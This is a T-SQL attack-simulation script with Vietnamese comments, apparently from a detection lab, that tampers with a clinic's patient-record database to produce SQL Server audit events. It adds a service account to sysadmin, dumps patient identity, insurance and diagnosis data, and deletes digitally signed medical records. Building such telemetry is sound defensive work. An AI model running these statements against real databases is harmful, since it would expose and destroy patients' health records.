/*
================================================================================
Tep: 02_telemetry_and_scenarios/scenario_03_his_db_tampering/abuse_svc_his_read_delete_emr.sql

KICH BAN 3 - PHA P2 (persistence) + P4 (doc hang loat + xoa benh an da ky so).
Chay trong LAB CO LAP (clinic.local) 

THU TU CHAY:
  1. enable_xp_cmdshell_15457.sql   (P3)
  2. abuse_svc_his_read_delete_emr.sql  <-- FILE NAY (P2 persistence + P4 doc/xoa)
  3. disable_sql_audit_33205.sql     (P5 - CUOI CUNG)
  Ly do: phai doc/xoa KHI audit con ON thi moi sinh 33205 lam ground truth. Neu
  tat audit truoc thi DELETE khong con dau vet de bat.

TIEN DE: phien ket noi da o quyen sysadmin (lay o P2 qua single-user mode, xem
README.md). Buoc 1 duoi day la buoc "ghi quyen vinh vien" (persistence) de tai
khoan dich vu tu nang len sysadmin - chinh no sinh 33205 role-change ma V4 bat.

TELEMETRY sinh ra de bat (khi audit con ON):
  - Event ID 33205 SERVER_ROLE_MEMBER_CHANGE: them SVC_HIS_Database vao sysadmin.
  - Event ID 33205 SELECT so luong lon tren dbo.HoSoBenhAn.
  - Event ID 33205 DELETE tren ho so da ky so (DaKySoTT13 = 1) -> vuot DENY DELETE,
    vi pham truc tiep Thong tu 13/2025/TT-BYT (cam xoa benh an da ky so).
  Cau hinh audit o 01_clinic_lab_and_noise/his_mssql_database/Configure_SQL_Server_Audit_33205.sql
================================================================================
*/

SELECT SYSDATETIME() AS P2_P4_BatDau;
GO

-- ===== P2 (persistence): tu nang SVC_HIS_Database len sysadmin ==============
-- Sinh Event ID 33205 SERVER_ROLE_MEMBER_CHANGE (AUDIT_CHANGE da bat o audit spec).
-- Day la moc V4 bat. Sau buoc nay tai khoan dich vu bypass duoc DENY DELETE.
ALTER SERVER ROLE [sysadmin] ADD MEMBER [CLINIC\SVC_HIS_Database];
GO

-- ===== P4a: doc hang loat du lieu nhay cam (vi pham quyen Read - Luat BVDLCN 2025) =====
-- Mo phong exfiltration: dump toan bo CCCD, ten, chan doan. Sinh 33205 SELECT khoi luong lon,
-- khac han nhieu nen (nhieu la SELECT le tung MaBenhAn trong Invoke-HISXmlSync).
SELECT MaBenhAn, SoCCCD, MaTheBHYT, HoTen, ChanDoanICD10, PhacDoDieuTri
FROM HIS_ClinicDB.dbo.HoSoBenhAn;
GO

-- ===== P4b: xoa benh an da ky so (vi pham quyen Delete - Thong tu 13/2025/TT-BYT) =====
-- Day la hanh vi ma TT13 cam tuyet doi. DENY DELETE chi bi vuot nho da leo sysadmin o P2.
-- Sinh 33205 DELETE tren ho so DaKySoTT13 = 1.
DELETE FROM HIS_ClinicDB.dbo.HoSoBenhAn
WHERE DaKySoTT13 = 1;
GO

SELECT SYSDATETIME() AS P2_P4_KetThuc;
GO